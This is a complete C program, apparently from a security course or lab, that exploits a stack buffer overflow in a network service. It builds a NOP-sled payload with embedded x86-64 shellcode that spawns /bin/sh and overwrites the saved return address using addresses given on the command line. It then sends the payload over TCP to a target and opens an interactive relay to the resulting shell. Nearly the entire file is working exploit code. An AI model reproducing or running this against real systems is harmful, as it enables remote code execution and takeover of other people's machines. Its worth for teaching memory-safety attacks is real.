#define _POSIX_SOURCE

#include <stddef.h>
#include <errno.h>
#include <string.h>

typedef enum status_type {
	STATUS_SUCCESS,
	STATUS_FAILURE
} status_type;

typedef struct status_t {
	status_type type;
	const char* reason;
} status_t;

status_t success (void)
{
	return (status_t) {
		.type   = STATUS_SUCCESS,
		.reason = NULL
	};
}

status_t failure (const char* reason)
{
	return (status_t) {
		.type   = STATUS_FAILURE,
		.reason = reason
	};
}

status_t efailure (int err)
{
	return failure (strerror (err));
}

int failed (status_t s)
{
	return s.type == STATUS_FAILURE;
}


#include <stdlib.h>
#include <netdb.h>
#include <arpa/inet.h>

status_t connect_tcp (int (*the_socket),
                      const char* address,
                      const char* port)
{
	// Use TCP
	struct protoent* proto_tcp = getprotobyname ("tcp");
	if (proto_tcp == NULL)
		return failure ("TCP not supported");

	// Prepare a TCP/IPv4 socket
	int _the_socket = socket (PF_INET, SOCK_STREAM, proto_tcp->p_proto);
	if (_the_socket == -1)
		return efailure (errno);

	// Prepare IPv4 address given by address:port
	struct sockaddr_in svaddr = (struct sockaddr_in) {.sin_family = AF_INET};

	switch (inet_pton (AF_INET, address, &svaddr.sin_addr)) {
		case 1:  break;
		case 0:  return failure ("Invalid network address");
		default: return efailure (errno);
	}

	const char* endptr = port;
	long int port_l = strtoul (port, (char**)&endptr, 10);
	if ((*port == '\0' || *endptr != '\0') ||
	    (port_l < 0    || port_l > 65535))
		return failure ("Invalid port number");
	svaddr.sin_port = htons (port_l);

	// Connect TCP socket to address:port
	if (connect (_the_socket, (struct sockaddr*)&svaddr, sizeof (svaddr)) != 0)
		return efailure (errno);

	(*the_socket) = _the_socket;
	return success ();
}


#include <stdint.h>
#include <limits.h>
#include <stdbool.h>
#include <stdio.h>

bool has_zero (uint64_t n)
{
	for (int i = 0; i < sizeof (n); ++i)
		if (((char*)&n) [i] == 0)
			return true;
	return false;
}

status_t prepare_exploit (char* (*data),
                          size_t (*size),
                          uint64_t main_buf_addr,
                          uint64_t foo_buf_addr,
                          uint64_t rip_addr)
{
	static const char shellcode [] =
		"\xeb\x0e\x5f\x48\x31\xc0\x48\x89"
		"\xc6\x48\x89\xc2\xb0\x3b\x0f\x05"
		"\x48\x31\xc0\x48\x89\xc7\xb0\x69"
		"\x0f\x05\xe8\xe3\xff\xff\xff\x2f"
		"\x62\x69\x6e\x2f\x73\x68";

	size_t rip_offset = rip_addr - foo_buf_addr;
	size_t data_size  = rip_offset          // Distance to RIP
                      + sizeof (uint64_t)   // Size of RIP
                      + 128                 // 128 bytes of padding
                      + strlen (shellcode); // Payload

	// Get storage for payload
	char* _data = (char*) malloc (data_size + 1);
	if (_data == NULL)
		return failure ("Could not allocate memory for payload");

	// Prepare a proper C-string filled with IA32 NOPs
	memset (_data, 0x90, data_size);
	_data [data_size] = '\0';

	// Set the RIP to the highest address before the shell code
	uint64_t new_rip = main_buf_addr + data_size - strlen (shellcode);
	memcpy (_data + rip_offset, &new_rip, sizeof (uint64_t));

	// Copy in the shell code
	memcpy (_data + data_size - strlen (shellcode), shellcode, strlen (shellcode));

	(*data) = _data;
	(*size) = data_size;
	return success ();
}


#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

status_t send_exploit (const char* data, size_t size, int fd)
{
	size_t written = 0;
	while (written < size) {
		ssize_t l = write (fd, data + written, size - written);
		if (l == -1)
			return efailure (errno);
		written += l;
	}

	return success ();
}

status_t dump_exploit (const char* data, size_t size, const char* filename)
{
	int fd = creat (filename, 0644);
	if (fd == -1)
		return efailure (errno);

	status_t status = send_exploit (data, size, fd);
	if (failed (status))
		return status;

	if (close (fd) != 0)
		return efailure (errno);

	return success ();
}



void talktoserver (int clsck)
{
	for (;;) {
		char buf [256];
		int len = read (0, buf, 256);
		send (clsck, buf, len, 0);
		while ((len = recv (clsck, buf, 256, MSG_DONTWAIT)) > 0)
			write (1, buf, len);
		if (strncmp (buf, "exit\n", 5)==0)
			return;
	}
}



status_t parse_address (uint64_t (*addr),
                        const char* addr_s)
{
	const char* endptr = addr_s;
	uint64_t _addr = strtoull (addr_s, (char**)&endptr, 16);
	if ((*addr_s == '\0' || *endptr != '\0'))
		return failure ("Invalid address");

	(*addr) = _addr;
	return success ();
}

int main (int argc, char** argv)
{
	status_t status = success ();

	if (argc != 6) {
		fprintf (stderr, "Usage: %s address port main_buf_addr foo_buf_addr rip_addr\n", argc == 0 ? "attack" : argv [0]);
		return EXIT_FAILURE;
	}

	uint64_t main_buf_addr = 0;
	status = parse_address (&main_buf_addr, argv [3]);
	if (failed (status)) {
		fprintf (stderr, "%s: %s\n", status.reason, argv [3]);
		return EXIT_FAILURE;
	}

	uint64_t foo_buf_addr = 0;
	status = parse_address (&foo_buf_addr, argv [4]);
	if (failed (status)) {
		fprintf (stderr, "%s: %s\n", status.reason, argv [4]);
		return EXIT_FAILURE;
	}

	uint64_t rip_addr = 0;
	status = parse_address (&rip_addr, argv [5]);
	if (failed (status)) {
		fprintf (stderr, "%s: %s\n", status.reason, argv [5]);
		return EXIT_FAILURE;
	}

	char* exploit = NULL;
	size_t exploit_size = 0;
	status = prepare_exploit (&exploit, &exploit_size, main_buf_addr, foo_buf_addr, rip_addr);
	if (failed (status)) {
		fprintf (stderr, "Could not prepare exploit (%s)\n", status.reason);
		return EXIT_FAILURE;
	}

	const char* filename = "bad.dat";
	status = dump_exploit (exploit, exploit_size, filename);
	if (failed (status)) {
		fprintf (stderr, "Could not dump exploit to %s (%s)\n", filename, status.reason);
		return EXIT_FAILURE;
	}

	int echo_socket = -1;
	status = connect_tcp (&echo_socket, argv [1], argv [2]);
	if (failed (status)) {
		fprintf (stderr, "Could not connect to %s:%s (%s)\n", argv [1], argv [2], status.reason);
		return EXIT_FAILURE;
	}

	status = send_exploit (exploit, exploit_size, echo_socket);
	if (failed (status)) {
		fprintf (stderr, "Could not send exploit to %s:%s (%s)\n", argv [1], argv [2], status.reason);
		return EXIT_FAILURE;
	}

	talktoserver (echo_socket);

	free (exploit);
	close (echo_socket);

	return EXIT_SUCCESS;
}
